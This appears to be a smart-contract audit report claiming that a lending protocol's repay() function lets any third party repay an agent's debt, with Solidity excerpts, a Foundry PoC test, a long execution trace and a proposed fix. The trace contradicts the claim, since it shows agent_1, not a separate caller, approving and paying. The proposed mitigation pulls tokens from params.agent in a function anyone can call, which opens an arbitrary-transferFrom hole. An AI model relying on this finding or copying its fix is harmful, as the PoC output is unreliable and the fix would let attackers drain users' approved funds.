#### [H-01] repay() function allows arbitrary third-party to repay on behalf of agent without authorization

_Severity:_ High

_Root Cause:_ https://github.com/sherlock-audit/2025-07-cap-Yahaya-Salisu/blob/main/cap-contracts%2Fcontracts%2FlendingPool%2Flibraries%2FBorrowLogic.sol#L99-L127

### Summary:

borrowParams in `borrow()` function addressed `agent` as a msg.sender.
```solidity
BorrowParams({
                agent: msg.sender, // agent is a msg.sender
                asset: _asset,
                amount: _amount,
                receiver: _receiver,
                maxBorrow: _amount == type(uint256).max
            })
```

But in `repay()` function the msg.sender is a `caller` not `agent`
```solidity
RepayParams({
            agent: _agent, // agent is not msg.sender
            asset: _asset, 
            amount: _amount,
            caller: msg.sender // caller is a msg.sender
            })
```

The `repay()` function in `Lender.sol` is an `agent facing`, and it shouldn't be called by any user except the `agent`. The agent should be a `msg.sender` in the `repay()` function too, but since the agent is not `msg.sender` in the `repay()` function, that means anyone can call `repay()` and paid the debts of agent without authorization.

The issue occurs here in `repay()` where the function

1. Sets `caller == msg.sender` not agent,

2. Updates the interest of `params.agent`,

3. Fetches the debt balance of `params.agent`,

4. But transfers tokens from `params.caller`.

This means the caller (msg.sender) will always repay the debt of the `agent`, even if they are not the same person. The function incorrectly assumes that `caller` intends to repay on behalf of `agent`, without requiring any approval.

This allows an arbitrary third party (caller) to repay the debt of any agent, without restriction.

```solidity
    function repay(ILender.LenderStorage storage $, ILender.RepayParams memory params)
        external
        returns (uint256 repaid)
    {

// updates interest of agent
        realizeRestakerInterest($, params.agent, params.asset); 

        ILender.ReserveData storage reserve = $.reservesData[params.asset];

// taking the balanceOf agent
         uint256 agentDebt = IERC20(reserve.debtToken).balanceOf(params.agent); 

// but transfers repaid amount from the caller (msg.sender)
IERC20(params.asset).safeTransferFrom(params.caller, address(this), repaid);
```


### Internal Pre-conditions

A. Agent borrowed assets from protocol

B. Arbitrary user (non-agent) calls `repay()` and the repay agreed and proceeds the repayment of any agent's debt, even though the caller may not be an agent.

C. The balance of agent is cleared and the caller loses their funds.



### External Pre-conditions

_None_


### Attack Path

1. Agent borrowed assets from protocol

2. Arbitrary user calls `repay()`, and the `repay()` function fetched debt balance of agent and updates the interest.

3. The `repay()` function transfers repay amounts from arbitrary user and paid the debt of agent.

4. Agent debts is cleared (paid by user). A user (msg.sender) losses their funds while agent gets free debt without repaying.

### Impact

Any third-party user can repay the debt of any agent, even without permission or relation.

This breaks user isolation and may cause griefing attacks where a malicious actor forcefully repays an agent's debt.

Loss of funds from unsuspecting users or automation bots and potential for bribe style attacks where off chain agreements exploit the lack of authorization checks.

C. In multi protocol systems, such forced repayment may trigger unexpected cross protocol consequences like unlocking of collateral or loss of farming position.



### PoC

The PoC below shows how an arbitrary user (caller) calls `repay()` function and repaid the debts of agent.

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.28;

import { Lender } from "../../contracts/lendingPool/Lender.sol";
import { Vault } from "../../contracts/vault/Vault.sol";

import { DebtToken } from "../../contracts/lendingPool/tokens/DebtToken.sol";

import { ValidationLogic } from "../../contracts/lendingPool/libraries/ValidationLogic.sol";
import { TestDeployer } from "../deploy/TestDeployer.sol";
import { MockERC20 } from "../mocks/MockERC20.sol";
import { console } from "forge-std/console.sol";

contract LenderBorrowTest is TestDeployer {
    address user_agent;
    address caller;

    DebtToken debtToken;

... existing code ...

    function test_lender_borrow_and_repay() public {
        vm.startPrank(user_agent);

        uint256 backingBefore = usdc.balanceOf(address(cUSD));

        vm.expectRevert(ValidationLogic.MinBorrowAmount.selector);
        lender.borrow(address(usdc), 99e6, user_agent);

        lender.borrow(address(usdc), 1000e6, user_agent);
        assertEq(usdc.balanceOf(user_agent), 1000e6);

        // simulate yield
        usdc.mint(user_agent, 1000e6);
        vm.stopPrank(); // the agent's prank stopped here since he finished borrow


// And the arbitrary user (caller) will call repay() and see if he can repay the debt of agent 
        vm.startPrank(caller);

        // repay the debt
        usdc.approve(env.infra.lender, 1000e6 + 10e6);
        lender.repay(address(usdc), 1000e6, user_agent);
        assertGe(usdc.balanceOf(address(cUSD)), backingBefore);

    }
}
```

Tet suits:
```
forge test --match-path LenderBorrowTest.t.sol -vvvv
```

Output:

```solidity
├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], value: 1000000000 [1e9]) 
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ emit Borrow(asset: USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4], agent: agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], amount: 1000000000 [1e9])
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003b9aca00
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003b9aca00
    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003b9aca00
    ├─ [604] USDC::balanceOf(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [staticcall]
    │   └─ ← [Return] 1000000000 [1e9]
    ├─ [0] VM::assertEq(1000000000 [1e9], 1000000000 [1e9]) [staticcall]
    │   └─ ← [Return]
    ├─ [7860] USDC::mint(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], 1000000000 [1e9])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], value: 1000000000 [1e9])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7])
    │   └─ ← [Return]
    ├─ [24757] USDC::approve(LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1], 1010000000 [1.01e9])
    │   ├─ emit Approval(owner: agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], spender: LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1], value: 1010000000 [1.01e9])
    │   └─ ← [Return] true
    ├─ [114312] LenderProxy::fallback(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4], 1000000000 [1e9], agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7])
    │   ├─ [113919] LenderImplem::repay(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4], 1000000000 [1e9], agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [delegatecall]
    │   │   ├─ [112501] BorrowLogic::e1481c1d(d6af1ec8a1789f5ada2b972bd1569f7c83af2e268be17cd65efe8474ebf0880000000000000000000000000030eb4be5df16b48e660fd697c1ac4322c48204d7000000000000000000000000e74f13d999fb246e2e74dd2cbad138806fb6fec4000000000000000000000000000000000000000000000000000000003b9aca0000000000000000000000000030eb4be5df16b48e660fd697c1ac4322c48204d7) [delegatecall]
    │   │   │   ├─ [4659] ViewLogic::5afe0823(d6af1ec8a1789f5ada2b972bd1569f7c83af2e268be17cd65efe8474ebf0880000000000000000000000000030eb4be5df16b48e660fd697c1ac4322c48204d7000000000000000000000000e74f13d999fb246e2e74dd2cbad138806fb6fec4) [delegatecall]
    │   │   │   │   ├─ [1452] debtUSDC::fallback(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [staticcall]
    │   │   │   │   │   ├─ [1068] DebtToken::balanceOf(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 1000000000 [1e9]
    │   │   │   │   │   └─ ← [Return] 1000000000 [1e9]
    │   │   │   │   ├─ [979] OracleProxy::fallback(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [staticcall]
    │   │   │   │   │   ├─ [595] OracleImplem::restakerRate(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 50100000000000000000000000 [5.01e25]
    │   │   │   │   │   └─ ← [Return] 50100000000000000000000000 [5.01e25]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [2173] cUSD::fallback(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4]) [staticcall]
    │   │   │   │   ├─ [1789] CapTokenImplem::availableBalance(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4]) [delegatecall]
    │   │   │   │   │   ├─ [875] VaultLogic::50ba5827(e912a1b0cc7579bc5827e495c2ce52587bc3871751e3281fc5599b38c3bfc400000000000000000000000000e74f13d999fb246e2e74dd2cbad138806fb6fec4) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000028fa6ae00
    │   │   │   │   │   └─ ← [Return] 11000000000 [1.1e10]
    │   │   │   │   └─ ← [Return] 11000000000 [1.1e10]
    │   │   │   ├─ [1452] debtUSDC::fallback(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [staticcall]
    │   │   │   │   ├─ [1068] DebtToken::balanceOf(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1000000000 [1e9]
    │   │   │   │   └─ ← [Return] 1000000000 [1e9]
    │   │   │   ├─ [26057] USDC::transferFrom(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1], 1000000000 [1e9])
    │   │   │   │   ├─ emit Transfer(from: agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], to: LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1], value: 1000000000 [1e9])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [24757] USDC::approve(cUSD: [0xB12c95BE580BFd04981aE4414a5E7971b1c8Df14], 1000000000 [1e9])
    │   │   │   │   ├─ emit Approval(owner: LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1], spender: cUSD: [0xB12c95BE580BFd04981aE4414a5E7971b1c8Df14], value: 1000000000 [1e9])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [15361] cUSD::fallback(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4], 1000000000 [1e9])
    │   │   │   │   ├─ [14977] CapTokenImplem::repay(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4], 1000000000 [1e9]) [delegatecall]
    │   │   │   │   │   ├─ [3534] AccessControlProxy::fallback(0x22867d78, cUSD: [0xB12c95BE580BFd04981aE4414a5E7971b1c8Df14], LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1]) [staticcall]
    │   │   │   │   │   │   ├─ [3141] AccessControlImplem::checkAccess(0x22867d78, cUSD: [0xB12c95BE580BFd04981aE4414a5E7971b1c8Df14], LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [9660] VaultLogic::2ebadfbe(e912a1b0cc7579bc5827e495c2ce52587bc3871751e3281fc5599b38c3bfc400000000000000000000000000e74f13d999fb246e2e74dd2cbad138806fb6fec4000000000000000000000000000000000000000000000000000000003b9aca00) [delegatecall]
    │   │   │   │   │   │   ├─ [4157] USDC::transferFrom(LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1], cUSD: [0xB12c95BE580BFd04981aE4414a5E7971b1c8Df14], 1000000000 [1e9])
    │   │   │   │   │   │   │   ├─ emit Transfer(from: LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1], to: cUSD: [0xB12c95BE580BFd04981aE4414a5E7971b1c8Df14], value: 1000000000 [1e9])
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   ├─ emit Repay(repayer: LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1], asset: USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4], amount: 1000000000 [1e9])
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [22071] debtUSDC::fallback(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], 1000000000 [1e9])
    │   │   │   │   ├─ [21687] DebtToken::burn(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], 1000000000 [1e9]) [delegatecall]
    │   │   │   │   │   ├─ [4709] OracleProxy::fallback(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4])
    │   │   │   │   │   │   ├─ [4325] OracleImplem::marketRate(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4]) [delegatecall]
    │   │   │   │   │   │   │   ├─ [1937] AaveAdapter::rate(MockAaveDataProvider: [0x4FD34F1d47dC4Ec7558c9245136B3644bAF4FDb0], USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4])
    │   │   │   │   │   │   │   │   ├─ [671] MockAaveDataProvider::getReserveData(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4]) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0, 0, 0, 100000000000000000000000000 [1e26], 0, 0, 0, 0, 1744289280 [1.744e9]
    │   │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   │   │   │   │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   │   │   │   │   ├─ [1002] OracleProxy::fallback(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4]) [staticcall]
    │   │   │   │   │   │   ├─ [618] OracleImplem::benchmarkRate(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 150000000000000000000000000 [1.5e26]
    │   │   │   │   │   │   └─ ← [Return] 150000000000000000000000000 [1.5e26]
    │   │   │   │   │   ├─ [4810] OracleProxy::fallback(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4])
    │   │   │   │   │   │   ├─ [4426] OracleImplem::utilizationRate(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4]) [delegatecall]
    │   │   │   │   │   │   │   ├─ [1937] AaveAdapter::rate(MockAaveDataProvider: [0x4FD34F1d47dC4Ec7558c9245136B3644bAF4FDb0], USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4])
    │   │   │   │   │   │   │   │   ├─ [671] MockAaveDataProvider::getReserveData(USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4]) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0, 0, 0, 100000000000000000000000000 [1e26], 0, 0, 0, 0, 1744289280 [1.744e9]
    │   │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   │   │   │   │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   │   │   │   │   ├─ [3534] AccessControlProxy::fallback(0x9dc29fac, debtUSDC: [0x1167fCe71A89D843165f157DD7bB85b9CcBCb342], LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1]) [staticcall]
    │   │   │   │   │   │   ├─ [3141] AccessControlImplem::checkAccess(0x9dc29fac, debtUSDC: [0x1167fCe71A89D843165f157DD7bB85b9CcBCb342], LenderProxy: [0xb495fD92BE2c71a61257490E9B8eCfe8eCec30D1]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ emit Transfer(from: agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], to: 0x0000000000000000000000000000000000000000, value: 1000000000 [1e9]) 
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [1452] debtUSDC::fallback(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [staticcall]
    │   │   │   │   ├─ [1068] DebtToken::balanceOf(agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ emit TotalRepayment(agent: agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], asset: USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4])
    │   │   │   ├─ emit Repay(asset: USDC: [0xE74F13d999fb246e2e74DD2CBAd138806Fb6Fec4], agent: agent_1: [0x30eB4Be5Df16b48e660fd697C1ac4322C48204D7], details: RepaymentDetails({ repaid: 1000000000 [1e9], vaultRepaid: 1000000000 [1e9], restakerRepaid: 0, interestRepaid: 0 }))
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000003b9aca00
    │   │   └─ ← [Return] 1000000000 [1e9]
    │   └─ ← [Return] 1000000000 [1e9]
    ├─ [604] USDC::balanceOf(cUSD: [0xB12c95BE580BFd04981aE4414a5E7971b1c8Df14]) [staticcall]
    │   └─ ← [Return] 12000000000 [1.2e10]
    ├─ [0] VM::assertGe(12000000000 [1.2e10], 12000000000 [1.2e10]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.37s (12.71ms CPU time)

Ran 1 test suite in 3.56s (1.37s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```


### Mitigation

The `repay()` function should address the agent as a msg.sender, exactly like in `borrow()` function, and also should transfer the assets from agent not caller.

```solidity
     function repay(ILender.LenderStorage storage $, ILender.RepayParams memory params)
        external
        returns (uint256 repaid)
    {
        /// Realize restaker interest before repaying
        realizeRestakerInterest($, params.agent, params.asset);

        ILender.ReserveData storage reserve = $.reservesData[params.asset];

        /// Can only repay up to the amount owed
        uint256 agentDebt = IERC20(reserve.debtToken).balanceOf(params.agent);
        repaid = Math.min(params.amount, agentDebt);

        uint256 remainingDebt = agentDebt - repaid;
        if (remainingDebt > 0 && remainingDebt < reserve.minBorrow) {
            // Limit repayment to maintain minimum debt if not full repayment
            repaid = agentDebt - reserve.minBorrow;
        }

  // transferFrom should be from agent not msg.sender
IERC20(params.asset).safeTransferFrom(params.agent, address(this), repaid);

        uint256 remaining = repaid;
        uint256 interestRepaid;
        uint256 restakerRepaid;
```